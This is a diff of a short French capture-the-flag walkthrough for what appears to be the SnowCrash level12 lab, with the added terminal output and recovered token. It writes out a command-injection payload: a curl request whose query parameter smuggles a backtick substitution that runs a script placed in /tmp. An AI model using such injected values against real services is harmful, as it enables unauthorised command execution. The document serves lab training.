@@ -1,4 +1,4 @@
-creer un fichier nommer FILE tel que file soit:
+creer un fichier nommer FILE dans le dossier /tmp tel que file soit:
 #!/bin/bash
 
 getflag > /tmp/flag
@@ -6,4 +6,8 @@ getflag > /tmp/flag
 
 
 lancer la commande curl 'localhost:4646?x="`/*/FILE`"'
-et recuperer le token dans /tmp/flag
+
+level12@SnowCrash:~$ curl 'localhost:4646?x="`/*/FILE`"'
+..level12@SnowCrash:~$ cat /tmp/flag
+
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
